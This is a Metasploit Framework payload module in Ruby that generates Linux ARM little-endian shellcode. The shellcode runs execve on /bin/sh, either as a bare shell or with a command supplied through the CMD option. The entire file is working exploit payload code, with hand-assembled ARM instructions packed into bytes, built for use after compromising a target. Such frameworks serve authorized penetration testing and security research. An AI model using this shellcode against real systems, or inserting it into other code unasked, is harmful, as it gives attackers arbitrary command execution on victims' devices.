##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 72

  include Msf::Payload::Single
  include Msf::Payload::Linux::Armle::Prepends

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Execute Command',
        'Description' => 'Execute an arbitrary command or just a /bin/sh shell',
        'Author' => [
          'Jonathan Salwan',
          'Spencer McIntyre'
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_ARMLE
      )
    )

    register_options([
      OptString.new('CMD', [ false, 'The command string to execute' ]),
    ])
  end

  def generate(_opts = {})
    cmd = datastore['CMD'] || ''

    if cmd.empty?
      # execve("/bin/sh", NULL, NULL)
      shellcode = [
        0xe28f000c, # add r0, pc, #12
        0xe3a01000, # mov r1, #0
        0xe3a02000, # mov r2, #0
        0xe3a0700b, # mov r7, #11   # __NR_execve
        0xef000000  # svc 0
      ].pack('V*')
      shellcode += "/bin/sh\x00"
    else
      # execve("/bin/sh", ["/bin/sh", "-c", CMD, NULL], NULL)
      shellcode = [
        0xe0244004, # eor r4, r4, r4
        0xe92d0010, # push {r4}              ; argv[3] = NULL
        0xe28f4030, # add r4, pc, #48        ; r4 = &cmd
        0xe92d0010, # push {r4}              ; argv[2] = &cmd
        0xe28f4024, # add r4, pc, #36        ; r4 = &"-c"
        0xe92d0010, # push {r4}              ; argv[1] = &"-c"
        0xe28f4014, # add r4, pc, #20        ; r4 = &"/bin/sh"
        0xe92d0010, # push {r4}              ; argv[0] = &"/bin/sh"
        0xe1a0100d, # mov r1, sp
        0xe28f0008, # add r0, pc, #8         ; r0 = &"/bin/sh"
        0xe3a02000, # mov r2, #0
        0xe3a0700b, # mov r7, #11            ; __NR_execve
        0xef000000  # svc 0
      ].pack('V*')
      shellcode += "/bin/sh\x00"
      shellcode += "-c\x00\x00"
      shellcode += cmd + "\x00"
    end

    # align our shellcode to 4 bytes
    shellcode += "\x00" while shellcode.bytesize % 4 != 0

    super.to_s + shellcode
  end
end
